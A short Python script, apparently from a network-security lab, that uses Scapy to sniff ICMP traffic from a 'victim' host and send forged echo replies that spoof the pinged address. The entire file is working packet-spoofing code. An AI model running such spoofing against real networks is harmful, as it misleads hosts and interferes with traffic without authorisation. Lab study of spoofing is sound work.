from scapy.all import *

victim_ip = "10.0.2.5"

def icmp_sniff(packet):
       if packet.haslayer(ICMP) and packet[IP].src == victim_ip:
          print(f"ICMP packet intercepted: {packet.summary()}")
          if packet[ICMP].type == 8:
             print(f"Echo request from {victim_ip}. Modifying packet...")
             reply = IP(dst=packet[IP].src, src=packet[IP].dst) / ICMP(type=0) / packet[Raw].load
             send(reply)
             print(f"Sent forged reply: {reply.summary()}")
          else:
             send(packet)
print(f"Starting ICMP packet interception...")
sniff(filter="icmp", prn=icmp_sniff)
